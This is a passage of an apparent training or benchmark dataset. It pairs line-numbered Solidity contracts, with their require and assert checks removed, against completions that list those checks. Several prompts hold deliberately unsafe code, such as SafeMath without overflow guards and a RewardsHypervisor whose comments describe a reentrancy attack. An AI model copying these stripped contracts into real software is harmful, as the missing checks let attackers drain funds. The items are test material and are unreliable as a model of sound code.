        "completion": "42+  require(err == 0, \"mint failed\");\n50+  require(redeemInternal(redeemTokens, false) == 0, \"redeem failed\");\n59+  require(redeemUnderlyingInternal(redeemAmount, false) == 0, \"redeem underlying failed\");\n67+  require(borrowInternal(borrowAmount, false) == 0, \"borrow failed\");\n76+  require(err == 0, \"repay failed\");\n85+  require(err == 0, \"repay behalf failed\");\n100+ require(err == 0, \"liquidate borrow failed\");\n154+ require(success, \"TOKEN_TRANSFER_IN_FAILED\");\n192+  require(success, \"TOKEN_TRANSFER_OUT_FAILED\");\n209+ require(comptroller.transferAllowed(address(this), src, dst, tokens) == 0, \"comptroller rejection\");\n210+ require(src != dst, \"bad input\");\n253+  require(comptroller.mintAllowed(address(this), minter, mintAmount) == 0, \"comptroller rejection\");\n260+   require(accrualBlockNumber == getBlockNumber(), \"market not fresh\");\n315+  require(redeemTokensIn == 0 || redeemAmountIn == 0, \"bad input\");\n336+  require(comptroller.redeemAllowed(address(this), redeemer, vars.redeemTokens) == 0, \"comptroller rejection\");\n343+  require(accrualBlockNumber == getBlockNumber(), \"market not fresh\");\n352+  require(getCashPrior() >= vars.redeemAmount, \"insufficient cash\");\n390+  require(\n            comptroller.seizeAllowed(address(this), seizerToken, liquidator, borrower, seizeTokens) == 0,\n            \"comptroller rejection\"\n        );\n402+   require(borrower != liquidator, \"invalid account pair\");"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 contract A {\n3    function testTuple() public pure{\n4       // (uint a, uint b) = (1, 3); //cannot handle multiple declarations in tuples\n5       uint a;\n6       uint b;\n7       (a,  b) = (1, 3);\n  \n\n8       (a, b) = returnTuple();\n   \n9       (a, b) = returnTupleByName();\n    \n10       //(, b) = returnTuple(); //can;t handle null placeholders\n11       //assert (b == 40);\n12    }\n   \n13    function returnTuple() private pure returns (uint, uint){\n14       return (4, 40); \n15    }\n\n16    function returnTupleByName() private pure returns (uint a, uint b){\n17       a = 5;\n18       b = 55;\n19       return (a,b); \n20    }\n21 }",
        "completion": "7+ assert (a == 1);\n7+ assert (b == 3);\n8+  assert (a == 4);\n8+ assert (b == 40);\n9+  assert (a == 5);\n9+  assert (b == 55);\n"
    },
    {
        "prompt": "1 /**\n2  *Submitted for verification at Etherscan.io on 2018-05-09\n3 */\n\n4 pragma solidity ^0.4.21;\n\n\n5 /**\n6  * @title SafeMath\n7  * @dev Math operations with safety checks that throw on error\n8  */\n9 library SafeMath {\n\n10   /**\n11   * @dev Multiplies two numbers, throws on overflow.\n12   */\n13   function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n14     if (a == 0) {\n15       return 0;\n16     }\n17     uint256 c = a * b;  \n18     return c;\n19   }\n\n20   /**\n21   * @dev Integer division of two numbers, truncating the quotient.\n22   */\n23   function div(uint256 a, uint256 b) internal pure returns (uint256) {\n24     // assert(b > 0); // Solidity automatically throws when dividing by 0\n25     // uint256 c = a / b;\n26     // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n27     return a / b;\n28   }\n\n29   /**\n30   * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).\n31   */\n32   function sub(uint256 a, uint256 b) internal pure returns (uint256) {  \n33     return a - b;\n34   }\n\n35   /**\n36   * @dev Adds two numbers, throws on overflow.\n37   */\n38   function add(uint256 a, uint256 b) internal pure returns (uint256) {\n39     uint256 c = a + b;\n40     return c;\n41   }\n42 }\n\n43 /**\n44  * @title ERC20Basic\n45  * @dev Simpler version of ERC20 interface\n46  * @dev see https://github.com/ethereum/EIPs/issues/179\n47  */\n48 contract ERC20Basic {\n49   function totalSupply() public view returns (uint256);\n50   function balanceOf(address who) public view returns (uint256);\n51   function transfer(address to, uint256 value) public returns (bool);\n52   event Transfer(address indexed from, address indexed to, uint256 value);\n53 }\n\n54 /**\n55  * @title ERC20 interface\n56  * @dev see https://github.com/ethereum/EIPs/issues/20\n57  */\n58 contract ERC20 is ERC20Basic {\n59   function allowance(address owner, address spender) public view returns (uint256);\n60   function transferFrom(address from, address to, uint256 value) public returns (bool);\n61   function approve(address spender, uint256 value) public returns (bool);\n62   event Approval(address indexed owner, address indexed spender, uint256 value);\n63 }\n\n64 /**\n65  * @title Basic token\n66  * @dev Basic version of StandardToken, with no allowances.\n67  */\n68 contract BasicToken is ERC20Basic {\n69   using SafeMath for uint256;\n\n70   mapping(address => uint256) balances;\n\n71   uint256 totalSupply_;\n\n72   /**\n73   * @dev total number of tokens in existence\n74   */\n75   function totalSupply() public view returns (uint256) {\n76     return totalSupply_;\n77   }\n\n78   /**\n79   * @dev transfer token for a specified address\n80   * @param _to The address to transfer to.\n81   * @param _value The amount to be transferred.\n82   */\n83   function transfer(address _to, uint256 _value) public returns (bool) {\n84     require(_to != address(0));\n85     require(_value <= balances[msg.sender]);\n\n86     balances[msg.sender] = balances[msg.sender].sub(_value);\n87     balances[_to] = balances[_to].add(_value);\n88     emit Transfer(msg.sender, _to, _value);\n89     return true;\n90   }\n\n91   /**\n92   * @dev Gets the balance of the specified address.\n93   * @param _owner The address to query the the balance of.\n94   * @return An uint256 representing the amount owned by the passed address.\n95   */\n96   function balanceOf(address _owner) public view returns (uint256 balance) {\n97     return balances[_owner];\n98   }\n\n99 }",
        "completion": "17+  assert(c / a == b);\n32+ assert(b <= a);\n39+  assert(c >= a);\n84+  require(_to != address(0));\n85+ require(_value <= balances[msg.sender]);"
    },
    {
        "prompt": "1 pragma solidity ^0.4.16;\n \n2 interface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public; }\n \n3 contract TokenERC20 {\n4     string public name;\n5     string public symbol;\n6     uint8 public decimals = 18;  // 18 \n7     uint256 public totalSupply;\n \n8     mapping (address => uint256) public balanceOf;  //\n9     mapping (address => mapping (address => uint256)) public allowance;\n \n10     event Transfer(address indexed from, address indexed to, uint256 value);\n \n11     event Burn(address indexed from, uint256 value);\n \n \n12     function TokenERC20(uint256 initialSupply, string tokenName, string tokenSymbol) public {\n13         totalSupply = initialSupply * 10 ** uint256(decimals);\n14         balanceOf[msg.sender] = totalSupply;\n15         name = tokenName;\n16         symbol = tokenSymbol;\n17     }\n \n \n18     function _transfer(address _from, address _to, uint _value) internal {\n19         require(_to != 0x0);\n20         require(balanceOf[_from] >= _value);\n21         require(balanceOf[_to] + _value > balanceOf[_to]);\n22         uint previousBalances = balanceOf[_from] + balanceOf[_to];\n23         balanceOf[_from] -= _value;\n24         balanceOf[_to] += _value;\n25         Transfer(_from, _to, _value);\n26         assert(balanceOf[_from] + balanceOf[_to] == previousBalances);\n27     }\n \n28     function transfer(address _to, uint256 _value) public returns (bool) {\n29         _transfer(msg.sender, _to, _value);\n30         return true;\n31     }\n \n32     function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n33         require(_value <= allowance[_from][msg.sender]);     // Check allowance\n34         allowance[_from][msg.sender] -= _value;\n35         _transfer(_from, _to, _value);\n36         return true;\n37     }\n \n38     function approve(address _spender, uint256 _value) public\n39         returns (bool success) {\n40         allowance[msg.sender][_spender] = _value;\n41         return true;\n42     }\n \n43     function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n44         tokenRecipient spender = tokenRecipient(_spender);\n45         if (approve(_spender, _value)) {\n46             spender.receiveApproval(msg.sender, _value, this, _extraData);\n47             return true;\n48         }\n49     }\n \n50     function burn(uint256 _value) public returns (bool success) {\n51         require(balanceOf[msg.sender] >= _value);\n52         balanceOf[msg.sender] -= _value;\n53         totalSupply -= _value;\n54         Burn(msg.sender, _value);\n55         return true;\n56     }\n \n57     function burnFrom(address _from, uint256 _value) public returns (bool success) {\n58         require(balanceOf[_from] >= _value);\n59         require(_value <= allowance[_from][msg.sender]);\n60         balanceOf[_from] -= _value;\n61         allowance[_from][msg.sender] -= _value;\n62         totalSupply -= _value;\n63         Burn(_from, _value);",
        "completion": "51+  require(balanceOf[msg.sender] >= _value);\n58+  require(balanceOf[_from] >= _value);\n59+  require(_value <= allowance[_from][msg.sender]);"
    },
    {
        "prompt": "1 contract SafeMath {\n\n2     function safeAdd(uint a, uint b) public pure returns (uint c) {\n3         c = a + b;\n4         require(c >= a);\n5     }\n\n6     function safeSub(uint a, uint b) public pure returns (uint c) {\n7         require(b <= a);\n8         c = a - b;\n9     }\n\n10     function safeMul(uint a, uint b) public pure returns (uint c) {\n11         c = a * b;\n12         require(a == 0 || c / a == b);\n13     }\n\n14     function safeDiv(uint a, uint b) public pure returns (uint c) {\n15         require(b > 0);\n16         c = a / b;\n17     }\n18 }\n\n\n19 /**\n20 ERC Token Standard #20 Interface\n21 https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md\n22 */\n23 contract ERC20Interface {\n24     function totalSupply() public constant returns (uint);\n25     function balanceOf(address tokenOwner) public constant returns (uint balance);\n26     function allowance(address tokenOwner, address spender) public constant returns (uint remaining);\n27     function transfer(address to, uint tokens) public returns (bool success);\n28     function approve(address spender, uint tokens) public returns (bool success);\n29     function transferFrom(address from, address to, uint tokens) public returns (bool success);\n\n30     event Transfer(address indexed from, address indexed to, uint tokens);\n31     event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n32 }\n\n\n33 /**\n34 Contract function to receive approval and execute function in one call\n\n35 Borrowed from MiniMeToken\n36 */\n37 contract ApproveAndCallFallBack {\n38     function receiveApproval(address from, uint256 tokens, address token, bytes data) public;\n39 }\n\n40 /**\n41 ERC20 Token, with the addition of symbol, name and decimals and assisted token transfers\n42 */\n43 contract SANTAToken is ERC20Interface, SafeMath {\n44     string public symbol;\n45     string public  name;\n46     uint8 public decimals;\n47     uint public _totalSupply;\n\n48     mapping(address => uint) balances;\n49     mapping(address => mapping(address => uint)) allowed;\n\n\n50     // ------------------------------------------------------------------------\n51     // Constructor\n52     // ------------------------------------------------------------------------\n53     constructor() public {\n54         symbol = \"SANTA\";\n55         name = \"santa.investments\";\n56         decimals = 0;\n57         _totalSupply = 100000000;\n58         balances[0x4a1D652Dfb96eec4cF8b7245A278296d6FdE632A] = _totalSupply;\n59         emit Transfer(address(0), 0x4a1D652Dfb96eec4cF8b7245A278296d6FdE632A, _totalSupply);\n60     }\n\n\n61     // ------------------------------------------------------------------------\n62     // Total supply\n63     // ------------------------------------------------------------------------\n64     function totalSupply() public constant returns (uint) {\n65         return _totalSupply  - balances[address(0)];\n66     }\n\n\n67     // ------------------------------------------------------------------------\n68     // Get the token balance for account tokenOwner\n69     // ------------------------------------------------------------------------\n70     function balanceOf(address tokenOwner) public constant returns (uint balance) {\n71         return balances[tokenOwner];\n72     }\n\n\n73     // ------------------------------------------------------------------------\n74     // Transfer the balance from token owner's account to to account\n75     // - Owner's account must have sufficient balance to transfer\n76     // - 0 value transfers are allowed\n77     // ------------------------------------------------------------------------\n78     function transfer(address to, uint tokens) public returns (bool success) {\n79         balances[msg.sender] = safeSub(balances[msg.sender], tokens);\n80         balances[to] = safeAdd(balances[to], tokens);\n81         emit Transfer(msg.sender, to, tokens);\n82         return true;\n83     }\n\n\n84     // ------------------------------------------------------------------------\n85     // Token owner can approve for spender to transferFrom(...) tokens\n86     // from the token owner's account\n87     //\n88     // https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md\n89     // recommends that there are no checks for the approval double-spend attack\n90     // as this should be implemented in user interfaces \n91     // ------------------------------------------------------------------------\n92     function approve(address spender, uint tokens) public returns (bool success) {\n93         allowed[msg.sender][spender] = tokens;\n94         emit Approval(msg.sender, spender, tokens);\n95         return true;\n96     }\n\n\n97     // ------------------------------------------------------------------------\n98     // Transfer tokens from the from account to the to account\n99     // \n100     // The calling account must already have sufficient tokens approve(...)-d\n101     // for spending from the from account and\n102     // - From account must have sufficient balance to transfer\n103     // - Spender must have sufficient allowance to transfer\n104     // - 0 value transfers are allowed\n105     // ------------------------------------------------------------------------\n106     function transferFrom(address from, address to, uint tokens) public returns (bool success) {\n107         balances[from] = safeSub(balances[from], tokens);\n108         allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);\n109         balances[to] = safeAdd(balances[to], tokens);\n110         emit Transfer(from, to, tokens);\n111         return true;\n112     }\n\n\n113     // ------------------------------------------------------------------------\n114     // Returns the amount of tokens approved by the owner that can be\n115     // transferred to the spender's account\n116     // ------------------------------------------------------------------------\n117     function allowance(address tokenOwner, address spender) public constant returns (uint remaining) {\n118         return allowed[tokenOwner][spender];\n119     }\n\n\n120     // ------------------------------------------------------------------------\n121     // Token owner can approve for spender to transferFrom(...) tokens\n122     // from the token owner's account. The spender contract function\n123     // receiveApproval(...) is then executed\n124     // ------------------------------------------------------------------------\n125     function approveAndCall(address spender, uint tokens, bytes data) public returns (bool success) {\n126         allowed[msg.sender][spender] = tokens;\n127         emit Approval(msg.sender, spender, tokens);\n128         ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, this, data);\n129         return true;\n130     }\n\n\n131     // ------------------------------------------------------------------------\n132     // Don't accept ETH\n133     // ------------------------------------------------------------------------\n134     function () public payable {\n135         revert();\n136     }\n137 }",
        "completion": "4+ require(c >= a);\n7+ require(b <= a);\n12+ require(a == 0 || c / a == b);\n15+ require(b > 0);"
    },
    {
        "prompt": "1 // array variable copy breaks\n\n2 contract ArrayLength {\n3     uint[12] a;\n\n4     constructor (uint[12] memory d) public\n5     {\n6         require (d[1] == 5);\n7         a = d;       \n8         assert (d[1] == 5);\n9     }\n\n10 }",
        "completion": "6+ require (d[1] == 5);\n8+  assert (d[1] == 5);"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 contract ArrayNestedFixedSize {\n\n3     // NOTE: the number of columns comes first in the declaration!\n4     uint[3][2] a;\n5     bool[2][2] aa;\n\n6     constructor() {\n7         assert (a[0][1] == 0);\n8         assert (!aa[0][1]);\n9     }\n\n10     function test() public {\n11         uint[3] b;\n12         a[0][0] = 0;\n13         a[0][1] = 1;\n14         uint x = a[0][0]; //print\n15         a[0][2] = 2;\n16         a[1][0] = 3; //may alias with a[0][0]\n17          x = a[0][0]; //print\n18         a[1][1] = 4;\n19         a[1][2] = 5;\n20         b[0] = 5;    //may alias with a[1][0] or a[0][0]\n21         x = a[0][0];  //print\n22         assert (a[0][0] == 0 || a[0][0] == 3);\n23         assert (a[0][1] == 1);\n24         assert (a[0][2] == 2);\n25         assert (a[1][0] == 3);\n26         assert (a[1][1] == 4);\n27         assert (a[1][2] == 5);\n\n28     }\n29 }",
        "completion": "7+ assert (a[0][1] == 0);\n8+  assert (!aa[0][1]);\n22+  assert (a[0][0] == 0 || a[0][0] == 3);\n23+  assert (a[0][1] == 1);\n24+ assert (a[0][2] == 2);\n25+ assert (a[1][0] == 3);\n26+  assert (a[1][1] == 4);\n27+ assert (a[1][2] == 5);\n"
    },
    {
        "prompt": "1 contract ArrayInit {\n\n2     uint[2] a;\n3     uint[2] b;\n    \n4     constructor() public {\n5        b[1] = 22;\n6        a[1] = 33;\n7        assert (b[1] == 22);\n8     }\n9 }",
        "completion": "7+ assert (b[1] == 22);"
    },
    {
        "prompt": "1 pragma solidity ^0.5.2;\n\n2 // Tests that function with inline assembly generates non-det result\n3 contract AssemblyTest\n4 {\n5         bool b;\n6         int x;\n7     constructor () public {\n8   }\n        \n9 function foo() public {\n10                 b = bar(x);\n11                 if (b)\n12                 assert(false);\n13         }\n14 function bar(int x) public returns (bool) { \n15         uint256 size;\n16         assembly { size := x }\n17         return size > 0;\n18         }\n19 }",
        "completion": "12+ assert(false);"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 contract Branch {\n\n3     function testIf(bool b) public returns (uint a) {\n4         if (b) {\n5             a = 1;\n6         } else {\n7             a = 2;\n8         }\n9         assert (a == 1 || a == 2);\n10     }\n\n11     function testTernary(bool b) public returns (uint a) {\n12         a = b ? 1 : 2;\n13         assert (a == 1 || a == 2);\n14     }\n\n15 }",
        "completion": "9+ assert (a == 1 || a == 2);\n13+ assert (a == 1 || a == 2);"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 contract Consts {\n\n3     constructor () public {\n4         uint a;\n5         address b;\n6         address c;\n\n7         a = 10;\n8         b = address(0x10);\n9         c = address(0x12);\n\n10         assert(b != c);\n11     }\n12}",
        "completion": "10+ assert(b != c);"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 contract Foo {\n\n3     uint a;\n\n4     constructor () public {\n5         a = 1;\n6     }\n\n7     function testConstructor() public {\n8         assert (a == 1);\n9     }\n\n10 }",
        "completion": "8+ assert (a == 1);"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 // This test shows an order in which base constructors for C are called:\n3 // B(a) calls base ctor A(a) {x = a};\n4 // ctor B is called {x++};\n5 // ctor C is called {x++}\n\n\n6 contract A {\n7     uint x;\n8     constructor (uint a) public {x = a;}\n9 }\n\n10 contract B is A {\n11     constructor (uint a) A(a) public {x++;}\n12 }    contract C is A, B {\n13     constructor (uint a) B(a) public {\n14          x++; \n15        assert (x == a + 2);\n16 }\n17 }",
        "completion": "15+ assert (x == a + 2);"
    },
    {
        "prompt": "1 // Shows that constructor chaining still has a bug\n2 // D constructor is called twice - see trace in corral.txt:\n3 // ctor D {x = 1}\n4 // ctor D {x = 1}\n5 // ctor B\n6 // ctor C\n\n7 contract D {\n8         uint x;\n9     constructor () public { x++; }\n10 }\n\n11 contract B is D {\n12     constructor () D() public {}\n13 }\n\n14 contract C is B {\n15     constructor () public {\n16          assert (x != 1); \n17 }   \n18 }",
        "completion": "16+ assert (x != 1); "
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 contract A {\n3    function testTuple() public pure{\n4       // (uint a, uint b) = (1, 3); //cannot handle multiple declarations in tuples\n5       uint a;\n6       uint b;\n7       /* only support function returns as tuples\n8       (a,  b) = (1, 3);\n9       assert (a == 1);\n10       assert (b == 3);\n11       */\n\n12       (a, b) = returnTuple();\n13       assert (a == 4);\n14       assert (b == 40);\n\n15       (a, b) = returnTupleByName();\n16       assert (a == 5);\n17       assert (b == 55);\n\n18       //(, b) = returnTuple(); //can;t handle null placeholders\n19       //assert (b == 40);\n20    }\n   \n21    function returnTuple() private pure returns (uint, uint){\n22       return (4, 40); \n23    }\n\n24    function returnTupleByName() private pure returns (uint a, uint b){\n25       a = 5;\n26       b = 55;\n27       return (a,b); \n28    }\n29 }",
        "completion": "9+       assert (a == 1);\n10+       assert (b == 3);\n13+       assert (a == 4);\n14+       assert (b == 40);\n16+       assert (a == 5);\n17+       assert (b == 55);\n"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 contract LoopFor {\n\n3     uint[2] a;\n\n4     function testBoundedForLoop() public {\n5         for (uint i = 0; i < 2; i += 1) {\n6             a[i] = i;\n7         }\n8         assert (a[0] == 0);\n9         assert (a[1] == 1);\n10     }\n\n11     uint[10] b;\n    \n12     function testUnboundedForLoop(uint n) public {\n13         require (n > 0 && n < 10);\n14         for (uint i = 0; i < n; i += 1) {\n15             b[i] = i;\n16         }\n17         for (uint j = 0; j < n; j += 1) {\n18             assert (b[j] == j);\n19         }\n20     }\n\n21 }",
        "completion": "8+ assert (a[0] == 0);\n9+ assert (a[1] == 1);\n18+ assert (b[j] == j);\n"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 contract ArrayDynamicStorage {\n\n3     uint[] sa;\n\n4     function ArrayDynamicStorage() {\n5        assert (sa.length == 0);\n6     }\n7     function test() public {\n8         sa.push(10);\n9         sa.push(11);\n10         assert (sa[0] == 10);\n11         assert (sa[1] == 11);\n12         assert (sa.length == 2);\n13     }\n\n14 }",
        "completion": "5+ assert (sa.length == 0);\n10+ assert (sa[0] == 10);\n11+ assert (sa[1] == 11);\n12+  assert (sa.length == 2);"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 contract ArrayFixedSize {\n\n3     uint[2] a;\n\n4     constructor() public {}\n\n5     function test() public {\n6         a[0] = 1;\n7         a[1] = 2;\n8         assert(a[0] == 1);\n9         assert(a[1] == 2);\n10     }\n11 }",
        "completion": "8+ assert(a[0] == 1);\n9+ assert(a[1] == 2);"
    },
    {
        "prompt": "1  contract ArrayInit {\n\n2     uint[2] a;\n3     uint[2] b;\n    \n4     constructor() public {\n5        b[1] = 22;\n6        a[1] = 33;\n7        assert (b[1] == 22);\n8     }\n9 }\n ",
        "completion": "7+ assert (b[1] == 22);"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 contract ArrayNestedFixedSize {\n\n3     // NOTE: the number of columns comes first in the declaration!\n4     uint[3][2] a;\n5     bool[2][2] aa;\n\n6     constructor() {\n7         assert (a[0][1] == 0);\n8         assert (!aa[0][1]);\n9     }\n\n10     function test() public {\n11         uint[3] b;\n12         a[0][0] = 0;\n13         a[0][1] = 1;\n14         uint x = a[0][0]; //print\n15         a[0][2] = 2;\n16         a[1][0] = 3; //may alias with a[0][0]\n17         x = a[0][0]; //print\n18         a[1][1] = 4;\n19         a[1][2] = 5;\n20         b[0] = 5;    //may alias with a[1][0] or a[0][0]\n21         x = a[0][0];  //print\n22         assert (a[0][0] == 0 || a[0][0] == 3);\n23         assert (a[0][1] == 1);\n24         assert (a[0][2] == 2);\n25         assert (a[1][0] == 3);\n26         assert (a[1][1] == 4);\n27         assert (a[1][2] == 5);\n28     }\n29 }",
        "completion": "7+ assert (a[0][1] == 0);\n8+  assert (!aa[0][1]);\n22+  assert (a[0][0] == 0 || a[0][0] == 3);\n23+ assert (a[0][1] == 1);\n24+ assert (a[0][2] == 2);\n25+ assert (a[1][0] == 3);\n26+ assert (a[1][1] == 4);\n27+ assert (a[1][2] == 5);"
    },
    {
        "prompt": "1 contract ArrayInit {\n\n2     uint[2] a;\n3     uint[2] b;\n    \n4     constructor() public {\n5        b[1] = 22;\n6        a[1] = 33;\n7        assert (b[1] == 22);\n8     }\n9 }",
        "completion": "7+ assert (b[1] == 22);"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 contract Consts {\n\n3     constructor () public {\n4         uint a;\n5         address b;\n6         address c;\n\n7         a = 10;\n8         b = address(0x10);\n9         c = address(0x12);\n\n10         assert(b != c);\n11     }\n12 }",
        "completion": "10+  assert(b != c);"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 contract Foo {\n\n3     uint a;\n\n4     constructor () public {\n5         a = 1;\n6     }\n\n7     function testConstructor() public {\n8         assert (a == 1);\n9     }\n10 }",
        "completion": "8+ assert (a == 1);"
    },
    {
        "prompt": "1 // SPDX-License-Identifier: GNU-GPL v3.0 or later\n\n2 pragma solidity ^0.8.0;\n\n3 import \"@openzeppelin/contracts/access/AccessControl.sol\";\n4 import \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\n5 import \"@openzeppelin/contracts/token/ERC1155/ERC1155.sol\";\n6 import \"./interfaces/IRevest.sol\";\n7 import \"./interfaces/IAddressRegistry.sol\";\n8 import \"./interfaces/ILockManager.sol\";\n9 import \"./interfaces/ITokenVault.sol\";\n10 import \"./interfaces/IAddressLock.sol\";\n11 import \"./utils/RevestAccessControl.sol\";\n12 import \"./interfaces/IFNFTHandler.sol\";\n13 import \"./interfaces/IMetadataHandler.sol\";\n\n14 contract FNFTHandler is ERC1155, AccessControl, RevestAccessControl, IFNFTHandler {\n\n15     bytes32 public constant PAUSER_ROLE = keccak256(\"PAUSER_ROLE\");\n\n16     mapping(uint => uint) public supply;\n17     uint public fnftsCreated = 0;\n\n18     /**\n19      * @dev Primary constructor to create an instance of NegativeEntropy\n20      * Grants ADMIN and MINTER_ROLE to whoever creates the contract\n21      */\n22     constructor(address provider) ERC1155(\"\") RevestAccessControl(provider) {\n23         _setupRole(DEFAULT_ADMIN_ROLE, _msgSender());\n24         _setupRole(PAUSER_ROLE, _msgSender());\n25     }\n\n26     /**\n27      * @dev See {IERC165-supportsInterface}.\n28      */\n29     function supportsInterface(bytes4 interfaceId) public view virtual override (AccessControl, ERC1155) returns (bool) {\n30         return super.supportsInterface(interfaceId);\n31     }\n\n\n32     function mint(address account, uint id, uint amount, bytes memory data) external override onlyRevestController {\n33         require(amount > 0, \"Invalid amount\");\n34         require(supply[id] == 0, \"Repeated mint for the same FNFT\");\n35         supply[id] += amount;\n36         _mint(account, id, amount, data);\n37         fnftsCreated += 1;\n38     }\n\n39     function mintBatchRec(address[] calldata recipients, uint[] calldata quantities, uint id, uint newSupply, bytes memory data) external override onlyRevestController {\n40         supply[id] += newSupply;\n41         for(uint i = 0; i < quantities.length; i++) {\n42             _mint(recipients[i], id, quantities[i], data);\n43         }\n44         fnftsCreated += 1;\n45     }\n\n46     function mintBatch(address to, uint[] memory ids, uint[] memory amounts, bytes memory data) external override onlyRevestController {\n47         _mintBatch(to, ids, amounts, data);\n48     }\n\n49     function setURI(string memory newuri) external override onlyRevestController {\n50         _setURI(newuri);\n51     }\n\n52     function burn(address account, uint id, uint amount) external override onlyRevestController {\n53         supply[id] -= amount;\n54         _burn(account, id, amount);\n55     }\n\n56     function burnBatch(address account, uint[] memory ids, uint[] memory amounts) external override onlyRevestController {\n57         _burnBatch(account, ids, amounts);\n58     }\n\n59     function getBalance(address account, uint id) external view override returns (uint) {\n60         return balanceOf(account, id);\n61     }\n\n62     function getSupply(uint fnftId) public view override returns (uint) {\n63         return supply[fnftId];\n64     }\n\n65     function getNextId() public view override returns (uint) {\n66         return fnftsCreated;\n67     }\n\n\n68     // OVERIDDEN ERC-1155 METHODS\n\n69     function _beforeTokenTransfer(\n70         address operator,\n71         address from,\n72         address to,\n73         uint[] memory ids,\n74         uint[] memory amounts,\n75         bytes memory data\n76     ) internal override {\n77         super._beforeTokenTransfer(operator, from, to, ids, amounts, data);\n78         // Loop because all batch transfers must be checked\n79         // Will only execute once on singular transfer\n80         if (from != address(0) && to != address(0)) {\n81             address vault = addressesProvider.getTokenVault();\n82             bool canTransfer = !ITokenVault(vault).getNontransferable(ids[0]);\n83             // Only check if not from minter\n84             // And not being burned\n85             if(ids.length > 1) {\n86                 uint iterator = 0;\n87                 while (canTransfer && iterator < ids.length) {\n88                     canTransfer = !ITokenVault(vault).getNontransferable(ids[iterator]);\n89                     iterator += 1;\n90                 }\n91             }\n92              require(canTransfer, \"E046\");\n93         }\n94     }\n\n95     function uri(uint fnftId) public view override returns (string memory) {\n96         return IMetadataHandler(addressesProvider.getMetadataHandler()).getTokenURI(fnftId);\n97     }\n\n98     function renderTokenURI(\n99         uint tokenId,\n100         address owner\n101     ) public view returns (\n102         string memory baseRenderURI,\n103         string[] memory parameters\n104     ) {\n105         return IMetadataHandler(addressesProvider.getMetadataHandler()).getRenderTokenURI(tokenId, owner);\n106     }\n\n107 }",
        "completion": "33+ require(amount > 0, \"Invalid amount\");\n34+ require(supply[id] == 0, \"Repeated mint for the same FNFT\");\n92+  require(canTransfer, \"E046\");\n"
    },
    {
        "prompt": "1 // SPDX-License-Identifier: BUSL-1.1\n\n2 pragma solidity 0.7.6;\n\n3 import \"@openzeppelin/contracts/math/SafeMath.sol\";\n4 import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n5 import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n6 import \"@openzeppelin/contracts/token/ERC20/SafeERC20.sol\";\n7 import \"@openzeppelin/contracts/access/Ownable.sol\";\n8 import \"./interfaces/IVisor.sol\";\n9 import \"./vVISR.sol\";\n\n10 // @title Rewards Hypervisor\n11 // @notice fractionalize balance \n12 contract RewardsHypervisor {\n13     using SafeERC20 for IERC20;\n14     using SafeMath for uint256;\n\n15     address public owner;\n16     IERC20 public visr;\n17     vVISR public vvisr;\n\n18     modifier onlyOwner {\n19         require(msg.sender == owner, \"only owner\");\n20         _;\n21     }\n\n22     constructor(\n23         address _visr,\n24         address _vvisr\n25     ) {\n26         visr = IERC20(_visr);\n27         vvisr = vVISR(_vvisr);\n28         owner = msg.sender;\n29     }\n\n30     function deposit(\n31         uint256 visrDeposit,\n32         address payable from,\n33         address to\n34     ) external returns (uint256 shares) {\n35         require(visrDeposit > 0, \"deposits must be nonzero\");\n36         require(to != address(0) && to != address(this), \"to\");\n37         require(from != address(0) && from != address(this), \"from\");\n\n38         shares = visrDeposit;\n39         if (vvisr.totalSupply() != 0) {\n40           uint256 visrBalance = visr.balanceOf(address(this));\n41           shares = shares.mul(vvisr.totalSupply()).div(visrBalance);\n42         }\n\n43         //this is the buggy line \n44         //call the owner function of the attack contract. \n45         //As long as the attack contract sets the return value to the contract address\n46         // call the delegatedTransferERC20 function of the attack contract. \n47         //Here reentrancy is executed\n48         if(isContract(from)) {\n49           require(IVisor(from).owner() == msg.sender); \n50           //deposit func is called again \n51           assert( IVisor(from) !=  address(this)); \n52           IVisor(from).delegatedTransferERC20(address(visr), address(this), visrDeposit);\n53         }\n54         else {\n55           visr.safeTransferFrom(from, address(this), visrDeposit);\n56         }\n\n57         vvisr.mint(to, shares);\n58     }\n\n59     // @param shares Number of rewards shares to redeem for VISR\n60     // @param to Address to which redeemed pool assets are sent\n61     // @param from Address from which liquidity tokens are sent\n62     // @return rewards Amount of visr redeemed by the submitted liquidity tokens\n63     function withdraw(\n64         uint256 shares,\n65         address to,\n66         address payable from\n67     ) external returns (uint256 rewards) {\n68         require(shares > 0, \"shares\");\n69         require(to != address(0), \"to\");\n70         require(from != address(0), \"from\");\n\n71         rewards = visr.balanceOf(address(this)).mul(shares).div(vvisr.totalSupply());\n72         visr.safeTransfer(to, rewards);\n\n73         require(from == msg.sender || IVisor(from).owner() == msg.sender, \"Sender must own the tokens\");\n74         vvisr.burn(from, shares);\n75     }\n\n76     function snapshot() 